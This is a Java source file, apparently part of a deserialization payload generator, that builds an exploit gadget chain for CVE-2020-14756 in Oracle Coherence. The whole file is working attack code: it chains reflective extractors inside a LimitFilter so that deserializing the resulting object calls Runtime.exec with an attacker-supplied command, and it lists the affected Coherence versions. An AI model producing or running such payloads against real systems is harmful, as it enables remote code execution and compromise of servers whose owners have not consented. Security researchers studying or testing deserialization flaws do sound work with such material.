package com.ppp.chain.coherence;

import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;

import java.lang.reflect.Field;

// CVE-2020-14756

/*
 * gadget:
 *  AttributeHolder.readExternal()
        ExternalizableHelper.readObject()
            ExternalizableHelper.readObjectInternal()
                ExternalizableHelper.readExternalizableLite()
                    PartialResult.readExternal()
                        PartialResult.add()
                            SortedBag.add()
                                ...
                                    AbstractExtractor.compare()
                                        MvelExtractor.extract()
 */

@Dependencies({"coherence:3.7.1.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0"})
@Authors({Authors.CCKUAILONG})
@Sink({Sink.Default})
public class Coherence1 implements ObjectPayload<Object> {
    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Coherence1.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain((String) sinkObject);

        return kickOffObject;
    }

    public Object getChain(String command) throws Exception {
        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                new ReflectionExtractor("getMethod", new Object[]{
                        "getRuntime", new Class[0]
                }),
                new ReflectionExtractor("invoke", new Object[]{null, new Object[0]}),
//                new ReflectionExtractor("exec", new Object[]{new String[]{"bash", "-c", command}})
                new ReflectionExtractor("exec", new Object[]{command})
        };

        LimitFilter limitFilter = new LimitFilter();
        limitFilter.setTopAnchor(Runtime.class);

        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, new ChainedExtractor(valueExtractors));
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, Runtime.class);

        return KickOff.badAttributeValueExpException(limitFilter);
//        BadAttributeValueExpException expException = new BadAttributeValueExpException(null);
//        Field val = expException.getClass().getDeclaredField("val");
//        val.setAccessible(true);
//        val.set(expException, limitFilter);
//
//        return expException;
    }
}